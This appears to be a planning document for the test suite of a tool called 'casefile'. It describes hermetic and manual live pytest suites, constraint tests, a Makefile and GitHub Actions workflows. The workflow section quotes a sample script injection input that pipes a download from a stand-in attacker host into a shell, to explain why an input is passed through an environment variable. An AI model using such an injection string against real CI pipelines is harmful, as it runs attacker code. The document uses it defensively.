# casefile test suite plan

**Goal:** One hermetic suite that runs offline in one command locally and on every push, plus a
separate manual suite that checks real sources are still alive and still keyless.

**Spec:** [../specs/2026-08-27-casefile-design.md](../specs/2026-08-27-casefile-design.md)
**Master plan:** [2026-08-27-casefile-master-plan.md](2026-08-27-casefile-master-plan.md)

---

## Two suites, one boundary

The boundary is the network, and it is the only boundary that matters here.

| Suite | Marker | Network | Runs |
|---|---|---|---|
| Hermetic | none (default) | never | locally on `make check`, and on every push and pull request |
| Live | `live` | yes, real third-party services | manual only, via `workflow_dispatch` or `make live` |

Everything is hermetic by default. `pytest` with no arguments must never touch the network,
so a contributor on a plane or behind a proxy gets a full green run.

The live suite exists because recorded-response tests verify *parsing*, not that a source
still answers or is still free. That gap is real and cannot be closed by mocking, so it is
handled by a deliberate manual run rather than pretended away.

### pytest configuration

```toml
[tool.pytest.ini_options]
testpaths = ["tests"]
addopts = ["-m", "not live"]
markers = [
  "live: hits real third-party services. Excluded by default; run with `make live`.",
]
```

`make live` runs `pytest -m live`. pytest's `-m` is a single-value option, so the later
flag wins over `addopts`. That is the whole mechanism; no conftest hook needed.

---

## Test categories

### 1. Unit tests

Pure functions, no I/O. `detect.py` is the main body of these and gets table-driven
coverage of every detector, the ranking order, and the normalised output. A wrong
detection makes the entire page wrong, so this is where the density belongs.

### 2. Data tests

The catalogue validates itself: every entry parses, every `url` is `https://` and contains
`{value}`, every `accepts` value is a known type, no duplicate ids, every non-exempt type
has at least three sources, total slots above the phase bar.

These are the tests that stop a 400-entry catalogue rotting, and they are the review gate
for catalogue pull requests: "did CI pass and is the URL real" rather than a schema
argument.

### 3. Integration tests

Routes through `TestClient`, fetchers through `httpx.MockTransport`. Recorded responses
live beside their test, not in a shared blob, so a source's expected shape is readable next
to the code that parses it.

### 4. Constraint tests

The category worth naming separately, because these do not test behaviour. They enforce
decisions that would otherwise erode quietly as the codebase grows.

| Constraint | Test |
|---|---|
| No bulk input, ever | a second positional argument exits non-zero |
| Phase 1 touches no network | no `import httpx` anywhere under `src/casefile` |
| Catalogue is https-only | a `javascript:` url fails to load |
| Demo is inert | built output references no `127.0.0.1`, `localhost` or `/panel/` |
| Fixtures carry no real PII | demo data uses only `example.*` and RFC 5737/3849 ranges |
| Web app is loopback | `serve`'s `host` default is `127.0.0.1` |
| No telemetry | no analytics or reporting package appears in the dependency tree |

A constraint test failing is not a bug report, it is a design decision being reversed. The
failure messages say so.

### 5. Live tests

One per fetcher source, marked `live`, asserting only two things: it responds, and it
responds without a key. Never asserting specific content, because content changes and a
test that breaks when a domain's registrar changes is noise.

---

## Local entrypoint

A `Makefile`, because there are four commands and remembering which four is not a good use
of anyone's attention. No task runner dependency, no `nox`, no `tox`.

```make
.PHONY: check test live fmt lint demo
check: lint test        # exactly what CI runs
test:
	uv run pytest
live:
	uv run pytest -m live -v
lint:
	uv run ruff check
	uv run ruff format --check
fmt:
	uv run ruff format
	uv run ruff check --fix
demo:
	uv run casefile build-demo
```

`check` is the one command a contributor needs. `demo` joins `check` from phase 2, when
`build-demo` exists.

---

## GitHub Actions

Two workflows. Both accept `workflow_dispatch` so either can be run by hand from the
Actions tab.

### `.github/workflows/ci.yml`

```yaml
name: ci

on:
  push:
  pull_request:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: astral-sh/setup-uv@v5
        with:
          enable-cache: true
      - run: uv sync --all-extras --dev
      - run: uv run ruff check
      - run: uv run ruff format --check
      - run: uv run pytest -q
```

### `.github/workflows/live.yml`

```yaml
name: live sources

on:
  workflow_dispatch:
    inputs:
      pattern:
        description: "Optional pytest -k pattern to limit which sources are checked"
        required: false
        default: ""

jobs:
  live:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: astral-sh/setup-uv@v5
        with:
          enable-cache: true
      - run: uv sync --all-extras --dev
      - name: check live sources
        env:
          PATTERN: ${{ inputs.pattern }}
        run: |
          if [ -n "$PATTERN" ]; then
            uv run pytest -m live -k "$PATTERN" -v
          else
            uv run pytest -m live -v
          fi
```

`PATTERN` is passed through `env` rather than interpolated into the `run` script. A
`workflow_dispatch` input goes straight into the shell otherwise, which is a script
injection hole: an input of `"; curl evil.example | sh; #` would execute. Using `env` makes
it a shell variable instead of source code.

The live workflow is allowed to go red. It is manual and informational, gates nothing, and
a red run means a source moved, which is exactly what it exists to tell you.

Live checks are also the mechanism behind the master plan's requirement to re-verify
sources at the start of phases 3 and 4. Run the workflow instead of checking twenty sites
by hand.

---

## Test inventory by phase

| Phase | Modules |
|---|---|
| 1 | `test_detect.py` (all detectors plus ranking), `test_catalog.py`, `test_catalog_coverage.py`, `test_report.py`, `test_cli.py`, `test_web.py`, `test_constraints.py` |
| 2 | `test_demo_build.py`, plus the demo-data PII constraint |
| 3 | `test_fetchers.py`, `test_limits.py`, `test_panel_states.py`, `test_live_sources.py` (marked `live`) |
| 4 | `test_wmn.py`, `test_cache.py`, remaining fetcher cases, remaining live cases |

One test module per source module, with `test_constraints.py` as the deliberate exception:
its tests are grouped by what they defend rather than by what they import. Constraint tests
that have a natural home stay there (the single-positional check lives in `test_cli.py`, the
loopback default in `test_web.py`); `test_constraints.py` holds the cross-cutting ones that
belong to no single module.

`tests/conftest.py` holds shared fixtures only once two modules genuinely need the same
one. An empty conftest added in advance is a file waiting for a reason.

---

## Naming

Demo data lives in `demo_data/`, not `fixtures/`. "Fixture" already means a pytest
construct, and a directory of canned HTTP responses named `fixtures/` sitting next to a
test suite full of actual pytest fixtures invites exactly one confused pull request per
contributor.

---

## Deliberately not doing

- **Coverage tooling.** `pytest-cov` is a dependency and a percentage people optimise
  instead of writing the test that matters. The constraint tests and the catalogue data
  tests are the coverage that has teeth here. Add it if a contributor asks for the badge;
  it is one line and reversible.
- **Link-rot checking.** Cut in the earlier audit. A dead link is dead whether or not a
  command reported it.
- **Automated accessibility checks.** `axe` needs a browser and a Node toolchain, which the
  project does not otherwise have. The a11y requirements are enforced by targeted assertions
  instead: the label exists, the heading exists, the skip link exists.
- **Cross-browser testing.** One local user on their own machine. Not the failure mode.
- **Property-based testing.** `hypothesis` on the detectors is genuinely tempting and
  genuinely premature: the table-driven cases encode real inputs that matter, and generated
  strings would mostly assert that regexes reject noise.
